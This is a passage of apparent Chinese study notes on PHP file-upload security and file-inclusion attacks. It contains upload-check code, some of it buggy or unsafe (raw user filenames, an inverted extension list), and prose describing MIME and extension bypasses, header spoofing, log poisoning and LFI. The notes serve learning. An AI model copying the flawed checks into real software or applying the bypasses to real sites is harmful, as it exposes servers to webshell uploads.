punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">'仅允许上传图片！'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>value <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>startsWith: 用于匹配开头</p>\n<p>e.target.files [0]:e.target 是触发的标签，files 表示其中的文件，[0] 表示第一个</p>\n<p>e 是传入的事件对象 value 是选择框，最后就是清空，让用户重选</p>\n</blockquote>\n<blockquote>\n<p>PS:&lt;input&gt; 有 accept 属性 ( <code>accept=&quot;image/*&quot;</code> )，但是可以被绕过</p>\n</blockquote>\n<p>另外 AI 给的玩意儿：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">'input[type=\"file\"]'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">addEventListener</span><span class=\"token punctuation\">(</span><span class=\"token string\">'change'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">const</span> file <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>files<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">const</span> imageRegex <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">^image\\/(jpeg|png|gif|bmp)$</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>imageRegex<span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">.</span>type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">'仅允许上传 JPEG、PNG、GIF 或 BMP 格式的图片！'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>value <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">/*test 方法就是用来检测是否匹配正则的，^ 表示字符串开始，$ 表示结束 */</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">'input[type=\"file\"]'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">addEventListener</span><span class=\"token punctuation\">(</span><span class=\"token string\">'change'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">const</span> file <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>files<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">const</span> allowedExtensions <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'.jpg'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'.jpeg'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'.png'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'.gif'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">const</span> fileExtension <span class=\"token operator\">=</span> <span class=\"token string\">'.'</span> <span class=\"token operator\">+</span> file<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toLowerCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>allowedExtensions<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span>fileExtension<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">'仅允许上传 JPEG、PNG 或 GIF 格式的图片！'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>value <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>至少某个软件是使用扩展名区分的......</p>\n<p>6、请你利用请求包中 Content-Type 头检测文件的是否是图片</p>\n<blockquote>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$allowed</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'image/jpeg'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'image/png'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$allowed</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'文件类型不符'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">//[type] 就是返回文件的 MIME</span></pre></td></tr></table></figure></blockquote>\n<p>7、常见的图片类型（jpg,png,gif）的文件头有什么特征？试着在你的防护中加入对应的检测</p>\n<blockquote>\n<p>jpg:FF D8 结尾是 FF D9</p>\n<p>png:89 50 4E 47 0D 0A 1A 0A</p>\n<p>gif:47 49 46 38 39 61 (GIF89a，但实际上后面三个是版本)</p>\n</blockquote>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkFileHeader</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$headers</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token string single-quoted-string\">'jpg'</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"\\xFF\\xD8\\xFF\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token string single-quoted-string\">'png'</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"\\x89\\x50\\x4E\\x47\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token string single-quoted-string\">'gif'</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"GIF89a\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 定义关联数组</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$headers</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$type</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$header</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">// 这种写法适用于关联数组的遍历，as 后的就是临时变量，存储读取的键值</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$header</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token variable\">$type</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token comment\">//strpos 用于查找字符串中首次出现指定子字符串的位置</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">// 默认从零 (首位) 开始，返回数字 (第几位)，默认从头开始，也可再加参数指定</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token comment\">// 没有返回 false</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>8、请你写一个能够过滤.php 后缀的 waf</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$filename</span><span class=\"token operator\">=</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$fileExtension</span><span class=\"token operator\">=</span><span class=\"token function\">pathinfo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">,</span><span class=\"token constant\">PATHINFO_EXTENSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fileExtension</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token string single-quoted-string\">'php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'你在干什么？'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'uploaded/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'是的，就是这样。'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">/*pathinfo (string $path, int $options)</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>options 可选：</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>PATHINFO_DIRNAME：返回文件所在的目录名。</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>PATHINFO_BASENAME：返回文件的基本名称（包含扩展名）。</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>PATHINFO_EXTENSION：返回文件的扩展名。</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>PATHINFO_FILENAME：返回文件的基本名称（不包含扩展名）</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>不指定 option 返回关联数组，否则字符串 */</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>不如直接判断<span class=\"token constant\">MIME</span>（application<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>php或者text<span class=\"token operator\">/</span>x<span class=\"token operator\">-</span>php）</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>有时也用<span class=\"token function\">file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>而不是<span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'type'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>来获取<span class=\"token constant\">MIME</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>但是<span class=\"token constant\">MIME</span>可以伪造</pre></td></tr></table></figure><p>9、请你使用 file_put_content () 来实现一次文件上传到指定目录</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'uploads/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>10、文件上传除了导致 php 代码执行，还可能导致什么漏洞？</p>\n<blockquote>\n<p>任意文件覆盖漏洞，目录遍历漏洞（要能路径穿越），拒绝服务（DoS）攻击（上传大量垃圾），XSS（存储型），文件包含漏洞（上传包含恶意代码的 PHP 文件，然后构造请求让程序包含这个恶意文件，需要页面本身会动态包含上传文件）</p>\n</blockquote>\n<p>11、为后续做个铺垫，请你想办法捕捉到文件上传瞬间临时目录（Linux 下是 /tmp）下的文件变化（动作要快，姿势要帅，临时文件消失快）</p>\n<p>使用 inotify 监控 /tmp 目录</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> inotify-too <span class=\"token comment\">#安装</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>inotifywait <span class=\"token parameter variable\">-m</span> <span class=\"token parameter variable\">-e</span> create /tmp   <span class=\"token comment\">#监控目录文件创建事件</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#-m 持续监控，而不是一个就退出</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#-e create 指定监控的事件为创建</span></pre></td></tr></table></figure><h2 id=\"文件上传\"><a class=\"anchor\" href=\"#文件上传\">#</a> 文件上传</h2>\n<p><img loading=\"lazy\" data-src=\"1739202184876.png\" alt=\"1739202184876\" /></p>\n<p><img loading=\"lazy\" data-src=\"1739202230914.png\" alt=\"1739202230914\" /></p>\n<p><img loading=\"lazy\" data-src=\"1739202984987.png\" alt=\"1739202984987\" /></p>\n<p><img loading=\"lazy\" data-src=\"1739203097971.png\" alt=\"1739203097971\" /></p>\n<blockquote>\n<p>临时的副本文件会在脚本结束时消失。</p>\n<p>要保存被上传的文件，需要用 PHP 的 copy () 函数将它复制到其它位置</p>\n</blockquote>\n<p>其他：</p>\n<blockquote>\n<p><strong>$_FILES 数组内容如下:</strong></p>\n<p>$_FILES ['myFile']['name'] 客户端文件的原名称。</p>\n<p>$_FILES ['myFile']['type'] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如 &quot;image/gif&quot;。</p>\n<p>$_FILES ['myFile']['size'] 已上传文件的大小，单位为字节。</p>\n<p>$_FILES ['myFile']['tmp_name'] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在 php.ini 的 upload_tmp_dir 指定，但 用 putenv () 函数设置是不起作用的。</p>\n<p>$_FILES ['myFile']['error'] 和该文件上传相关的错误代码。['error'] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在 PHP 4.3.0 之后变成了 PHP 常量。)</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">UPLOAD_ERR_OK</span> <span class=\"token operator\">-</span> 值：<span class=\"token number\">0</span><span class=\"token punctuation\">;</span> 没有错误发生，文件上传成功。 </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token constant\">UPLOAD_ERR_INI_SIZE</span> <span class=\"token operator\">-</span> 值：<span class=\"token number\">1</span><span class=\"token punctuation\">;</span> 上传的文件超过了 php<span class=\"token operator\">.</span>ini 中 upload_max_filesize 选项限制的值。 </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token constant\">UPLOAD_ERR_FORM_SIZE</span> <span class=\"token operator\">-</span> 值：<span class=\"token number\">2</span><span class=\"token punctuation\">;</span> 上传文件的大小超过了 <span class=\"token constant\">HTML</span> 表单中 <span class=\"token constant\">MAX_FILE_SIZE</span> 选项指定的值。 </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token constant\">UPLOAD_ERR_PARTIAL</span> <span class=\"token operator\">-</span> 值：<span class=\"token number\">3</span><span class=\"token punctuation\">;</span> 文件只有部分被上传。 </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token constant\">UPLOAD_ERR_NO_FILE</span> <span class=\"token operator\">-</span> 值：<span class=\"token number\">4</span><span class=\"token punctuation\">;</span> 没有文件被上传。 </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token constant\">UPLOAD_ERR_NO_TMP_DIR</span> <span class=\"token operator\">-</span>其值为 <span class=\"token number\">6</span>，找不到临时文件夹。<span class=\"token constant\">PHP</span> <span class=\"token number\">4.3</span><span class=\"token number\">.10</span> 和 <span class=\"token constant\">PHP</span> <span class=\"token number\">5.0</span><span class=\"token number\">.3</span> 引进。</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token constant\">UPLOAD_ERR_CANT_WRITE</span> <span class=\"token operator\">-</span> 其值为 <span class=\"token number\">7</span>，文件写入失败。<span class=\"token constant\">PHP</span> <span class=\"token number\">5.1</span><span class=\"token number\">.0</span> 引进。</pre></td></tr></table></figure></blockquote>\n<h2 id=\"漏洞\"><a class=\"anchor\" href=\"#漏洞\">#</a> 漏洞</h2>\n<h3 id=\"扩展名\"><a class=\"anchor\" href=\"#扩展名\">#</a> 扩展名</h3>\n<p>一个前端的限制：</p>\n<blockquote>\n<p><img loading=\"lazy\" data-src=\"1739263171554.png\" alt=\"1739263171554\" /></p>\n</blockquote>\n<p>可以抓包改后缀 / 禁用 JS 来绕过～</p>\n<p>后端的限制，可以黑 / 白名单：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$temp</span><span class=\"token operator\">=</span><span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_FILE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$file_ext</span><span class=\"token operator\">=</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$allow_ext</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'asp'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'aspx'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$allow_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'POTATOWO'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'uploads/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'temp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'还是太善良了'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>然后是 CSDN 上的：</p>\n<p><img loading=\"lazy\" data-src=\"1739264583886.png\" alt=\"1739264583886\" /></p>\n<p>trim (): 用于去除字符串首尾的字符，默认是去空格，它在 JS 中是一个方法</p>\n<p>欸？为什么不用 pathinfo 呢？我也不清楚</p>\n<h3 id=\"mime\"><a class=\"anchor\" href=\"#mime\">#</a> MIME</h3>\n<p>上面说了。可以伪造，用 bp 修改 header</p>\n<h3 id=\"文件头\"><a class=\"anchor\" href=\"#文件头\">#</a> 文件头</h3>\n<p>幻术头字节是文件头的一部分，用于表示文件类型，文件头本身可能包含其他信息，比如图片的位深等</p>\n<h4 id=\"常见的\"><a class=\"anchor\" href=\"#常见的\">#</a> 常见的</h4>\n<blockquote>\n<p><img loading=\"lazy\" data-src=\"1739265242140.png\" alt=\"1739265242140\" /></p>\n</blockquote>\n<p><strong>绕过</strong></p>\n<p>对于 PHP 的文件由于 &lt;?php ...php&gt; 之前的都会被当成 html，所以写 php 文件前先乱写点什么</p>\n<h2 id=\"文件包含\"><a class=\"anchor\" href=\"#文件包含\">#</a> 文件包含</h2>\n<p>注入型漏洞</p>\n<p>包含是指调用被写在单个文件中的可重复使用函数</p>\n<p>漏洞出现于用户可选要包含的文件</p>\n<p>攻击者修改文件位置来执行任意文件</p>\n<h3 id=\"常用的函数\"><a class=\"anchor\" href=\"#常用的函数\">#</a> 常用的函数</h3>\n<ul>\n<li>require (): 找不到被包含的文件会产生致命错误，并停止脚本运行</li>\n<li>include (): 找不到被包含的文件只会产生警告，脚本继续执行</li>\n<li>require_once () 与 require () 类似：唯一的区别是如果该文件的代码已经被包含，则不会再次包含</li>\n<li>include_once () 与 include () 类似：唯一的区别是如果该文件的代码已经被包含，则不会再次包含</li>\n</ul>\n<p>它们的参数都是路径</p>\n<p>对于 PHP 来说，无论执行的文件是什么玩意儿，<strong>只要其中有 PHP 代码，就会执行</strong></p>\n<h3 id=\"本地文件包含lfi\"><a class=\"anchor\" href=\"#本地文件包含lfi\">#</a> 本地文件包含（LFI）</h3>\n<p>就是打开本地的文件，可以用于获取敏感信息</p>\n<p>例如：</p>\n<p><img loading=\"lazy\" data-src=\"1739611330897.png\" alt=\"1739611330897\" /></p>\n<p>显而易见，你可以用来执行文件上传漏洞的 webshell</p>\n<p>你可以它放在被包含的路径上</p>\n<h3 id=\"包含apache日志文件\"><a class=\"anchor\" href=\"#包含apache日志文件\">#</a> 包含 Apache 日志文件</h3>\n<blockquote>\n<p>如果没有上传但是包含，而且<strong>日志可读且已知路径</strong></p>\n</blockquote>\n<p>每次访问的 url 都会被记录到 access.log</p>\n<p>发生错误就记录到 error.log</p>\n<p>你可以在 url 中写 PHP 让它记录下来</p>\n<p>（注意：会被编码，记得 bp 抓包改报文）</p>\n<p>然后包含该日志</p>\n<p>有趣的是，执行的结果会替换在日志中的对应语句的 url 中（存疑）</p>\n<h3 id=\"包含session文件\"><a class=\"anchor\" href=\"#包含session文件\">#</a> 包含 SESSION 文件</h3>\n<blockquote>\n<p>SESSION 中有可控变量，并且可以读写，知道路径</p>\n</blockquote>\n<p><img loading=\"lazy\" data-src=\"1739612579792.png\" alt=\"1739612579792\" /></p>\n<h3 id=\"包含临时文件\"><a class=\"anchor\" href=\"#包含临时文件\">#</a> 包含临时文件</h3>\n<p>就是传说中的上传后的临时文件</p>\n<p>Linux 是 /tmp</p>\n<p>Windows 是 